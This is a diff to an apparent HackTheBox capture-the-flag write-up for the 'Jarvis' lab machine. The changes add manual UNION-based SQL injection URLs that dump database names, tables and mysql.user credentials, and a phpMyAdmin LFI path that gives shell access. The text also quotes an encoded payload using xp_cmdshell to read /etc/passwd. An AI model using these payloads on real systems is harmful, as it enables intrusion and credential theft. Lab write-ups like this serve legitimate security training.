@@ -1,5 +1,5 @@
 ---
-title: "HackTheBox - WriteUp 13"
+title: "HackTheBox - WriteUp 14"
 date: 2019-07-13T22:31:09+08:00
 description: "HackTheBox 练手 - Jarvis - SQLi+Systemd"
 featuredImage: "https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp"
@@ -14,13 +14,32 @@ dropCap: false
 
 Nmap result: 22,80 with Apache and php.
 
-SQLi Defender enabled, you should avoid `'` `"` `ORDER/order` `UNION/union` and also `9208%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23` in command within the request of `room.php?cod=`.
+SQLi Defender enabled, you should avoid `'` `"` `ORDER/order` `UNION/union` and also `9208%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23` in command within the request of `room.php?cod=`, but this defender is a crispy one, so it may not work.
 
 # User
 
 Step 1: Sqli
 
-`room.php?cod=1` Blind SQL Injection at param `cod`.
+`room.php?cod=1` SQL Injection at param `cod`. You can use SQLMap and get banned, then wait, then try again, repeat the step, you'll find it.
+
+The manual sqli should achieved like this:
+
+```
+10.10.10.143/room.php?cod=1 order by 7
+10.10.10.143/room.php?cod=-1 union select 1,2,3,4,5,6,7
+10.10.10.143/room.php?cod=-1 union select 1, group_concat(schema_name), 3, 4,
+5, 6, 7 from information_schema.schemata
+10.10.10.143/room.php?cod=-1 union select 1, group_concat(table_name), 3, 4,
+5, 6, 7 from information_schema.tables where table_schema='hotel'
+10.10.10.143/room.php?cod=-1 union select 1, group_concat(column_name), 3, 4,
+5, 6, 7 from information_schema.columns where table_name='room'
+10.10.10.143/room.php?cod=-1 union select 1, group_concat(table_name), 3, 4,
+5, 6, 7 from information_schema.tables where table_schema='mysql'
+10.10.10.143/room.php?cod=-1 union select 1, group_concat(column_name), 3, 4,
+5, 6, 7 from information_schema.columns where table_name='user'
+10.10.10.143/room.php?cod=-1 union select 1, group_concat(User,0x0a,Password),
+3, 4, 5, 6, 7 from mysql.user
+```
 
 Step 2: RCE
 
@@ -30,7 +49,7 @@ then follow the procedure here: https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4
 
 Get the cookie value of phpmyadmin: 3u5vpovmecn9md1dl7du5a4cthnul6pt
 
-The LFI: `http://127.0.0.1:9191/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_3u5vpovmecn9md1dl7du5a4cthnul6pt`
+The LFI: `http://10.10.10.143/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_3u5vpovmecn9md1dl7du5a4cthnul6pt`
 
 You'll get the shell or `www-data`.
 
